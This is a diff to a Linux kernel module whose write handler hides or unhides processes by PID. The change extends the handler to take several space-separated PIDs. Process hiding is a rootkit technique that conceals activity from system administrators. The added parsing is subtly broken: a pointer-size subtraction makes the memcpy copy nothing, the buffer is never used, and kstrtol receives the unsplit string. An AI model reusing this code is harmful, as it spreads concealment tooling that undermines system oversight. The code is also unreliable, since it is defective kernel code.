@@ -171,6 +171,9 @@ static ssize_t device_write(struct file *filep,
 {
     long pid;
     char *message;
+    char *start;
+    char *end;
+    char buf[10];
 
     char add_message[] = "add", del_message[] = "del";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
@@ -180,11 +183,45 @@ static ssize_t device_write(struct file *filep,
     memset(message, 0, len + 1);
     copy_from_user(message, buffer, len);
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+        start = message + sizeof(add_message);
+        while (1) {
+            for (; *start == ' ' && *start != '\0'; start++ ) {
+                // remove space at head
+             }
+
+            memset(buf, '\0', 10);
+            end = strchr(start + 1, ' ');
+            if (end==NULL) {
+                kstrtol(start, 10, &pid);
+                hide_process(pid);
+                break;
+            } else {
+                memcpy(buf, start, sizeof(start) - sizeof(end));
+                kstrtol(start, 10, &pid);
+                hide_process(pid);
+            }
+            start = end;
+        }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
-        kstrtol(message + sizeof(del_message), 10, &pid);
-        unhide_process(pid);
+        start = message + sizeof(del_message);
+        while (1) {
+            for (; *start == ' ' && *start != '\0'; start++ ) {
+                    // remove space at head
+            }
+
+            memset(buf, '\0', 10);
+            end = strchr(start + 1, ' ');
+            if (end==NULL) {
+                kstrtol(start, 10, &pid);
+                unhide_process(pid);
+                break;
+            } else {
+                memcpy(buf, start, sizeof(start) - sizeof(end));
+                kstrtol(start, 10, &pid);
+                unhide_process(pid);
+            }
+            start = end;
+        }
     } else {
         kfree(message);
         return -EAGAIN;
